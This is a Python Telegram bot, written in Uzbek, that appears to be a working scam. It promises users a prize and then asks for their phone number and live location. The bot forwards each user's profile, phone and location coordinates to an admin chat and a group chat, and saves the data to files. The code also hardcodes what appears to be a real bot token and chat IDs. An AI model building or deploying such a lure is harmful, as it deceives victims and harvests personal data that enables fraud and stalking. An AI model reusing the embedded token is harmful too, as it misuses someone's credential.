import os
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
from dotenv import load_dotenv
import logging
from datetime import datetime
import json

# Load environment variables
load_dotenv()

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Get configuration from environment variables
TOKEN = '8157405220:AAE_k6ADh7Uow8D8eDK3h0Ybd2oRCZYwQsE'
ADMIN_CHAT_ID = 7474435850
GROUP_CHAT_ID = -1002515772883

if not TOKEN:
    raise ValueError("TELEGRAM_BOT_TOKEN environment variable is not set!")

user_data_store = {}

def get_user_info(user):
    """Get comprehensive user information"""
    info = {
        "user_id": user.id,
        "first_name": user.first_name or "Mavjud emas",
        "last_name": user.last_name or "Mavjud emas",
        "username": f"@{user.username}" if user.username else "Mavjud emas",
        "language_code": user.language_code or "Mavjud emas",
        "is_bot": "Ha" if user.is_bot else "Yo'q",
        "registration_date": datetime.fromtimestamp(user.id >> 22 + 1420070400).strftime('%Y-%m-%d %H:%M:%S'),
        "join_date": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    return info

def format_user_data(data):
    """Format user data for display"""
    user_info = data["user_info"]
    message = (
        f"🔔 Yangi foydalanuvchi ma'lumotlari:\n\n"
        f"👤 Asosiy ma'lumotlar:\n"
        f"└ ID: {user_info['user_id']}\n"
        f"└ Ism: {user_info['first_name']}\n"
        f"└ Familiya: {user_info['last_name']}\n"
        f"└ Username: {user_info['username']}\n"
        f"└ Til: {user_info['language_code']}\n"
        f"└ Bot: {user_info['is_bot']}\n\n"
        f"📅 Vaqt ma'lumotlari:\n"
        f"└ Ro'yxatdan o'tgan: {user_info['registration_date']}\n"
        f"└ Qo'shilgan vaqti: {user_info['join_date']}\n\n"
    )
    
    if data.get("phone_number"):
        message += f"📱 Aloqa ma'lumotlari:\n└ Telefon: {data['phone_number']}\n\n"
    
    if data.get("location"):
        lat, lon = data["location"]
        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
        message += f"📍 Joylashuv:\n└ [Google Mapsda ko'rish]({maps_link})\n"
    
    return message

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = update.effective_user
        user_info = get_user_info(user)
        
        # Store initial user info
        user_data_store[user.id] = {
            "user_info": user_info,
            "phone_number": None,
            "location": None
        }
        
        # Send initial user info to admin and group
        initial_message = format_user_data(user_data_store[user.id])
        await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=initial_message, parse_mode="Markdown")
        await context.bot.send_message(chat_id=GROUP_CHAT_ID, text=initial_message, parse_mode="Markdown")
        
        await update.message.reply_text(
            f"Salom, {user.first_name}! Yutuqni olish uchun raqamingizni yuboring.",
            reply_markup=ReplyKeyboardMarkup(
                [[KeyboardButton("📲 Yutuqni olish uchun raqamni yuborish", request_contact=True)]],
                resize_keyboard=True,
                one_time_keyboard=True
            )
        )
    except Exception as e:
        logger.error(f"Error in start command: {e}")
        await update.message.reply_text("Kechirasiz, xatolik yuz berdi. Iltimos, qaytadan urinib ko'ring.")

async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        contact = update.message.contact
        user = update.effective_user
        phone_number = contact.phone_number

        if user.id not in user_data_store:
            user_data_store[user.id] = {"user_info": get_user_info(user)}

        user_data_store[user.id]["phone_number"] = phone_number

        # Send updated info with phone number
        updated_message = format_user_data(user_data_store[user.id])
        await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=updated_message, parse_mode="Markdown")
        await context.bot.send_message(chat_id=GROUP_CHAT_ID, text=updated_message, parse_mode="Markdown")

        location_keyboard = ReplyKeyboardMarkup(
            [[KeyboardButton("📍 Yutuqni olish uchun joylashuvingizni yuboring", request_location=True)]],
            resize_keyboard=True,
            one_time_keyboard=True
        )
        await update.message.reply_text(
            f"Rahmat, {user.first_name}.\nRaqamingiz qabul qilindi.\nEndi yutuqni olish uchun joylashuvingizni yuboring.",
            reply_markup=location_keyboard
        )
    except Exception as e:
        logger.error(f"Error in contact handler: {e}")
        await update.message.reply_text("Kechirasiz, xatolik yuz berdi. Iltimos, qaytadan urinib ko'ring.")

async def location_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        location = update.message.location
        user = update.effective_user

        if user.id not in user_data_store:
            await update.message.reply_text("Iltimos, avval raqamingizni yuboring.")
            return

        user_data_store[user.id]["location"] = (location.latitude, location.longitude)
        
        # Send final complete user info
        final_message = format_user_data(user_data_store[user.id])
        await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=final_message, parse_mode="Markdown")
        await context.bot.send_message(chat_id=GROUP_CHAT_ID, text=final_message, parse_mode="Markdown")

        await update.message.reply_text("Ma'lumotlar uchun rahmat! Yutug'ingiz tez orada sizga yetkaziladi.")
        
        # Save user data to file before clearing
        try:
            with open(f"user_data_{user.id}.json", "w", encoding="utf-8") as f:
                json.dump(user_data_store[user.id], f, ensure_ascii=False, indent=4)
        except Exception as e:
            logger.error(f"Error saving user data: {e}")
        
        # Clear user data after successful submission
        del user_data_store[user.id]
        
    except Exception as e:
        logger.error(f"Error in location handler: {e}")
        await update.message.reply_text("Kechirasiz, xatolik yuz berdi. Iltimos, qaytadan urinib ko'ring.")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Update {update} caused error {context.error}")

if __name__ == '__main__':
    try:
        app = ApplicationBuilder().token(TOKEN).build()

        app.add_handler(CommandHandler("start", start))
        app.add_handler(MessageHandler(filters.CONTACT, contact_handler))
        app.add_handler(MessageHandler(filters.LOCATION, location_handler))
        app.add_error_handler(error_handler)

        logger.info("Bot ishga tushdi...")
        app.run_polling()
    except Exception as e:
        logger.error(f"Bot ishga tushishida xatolik yuz berdi: {e}")
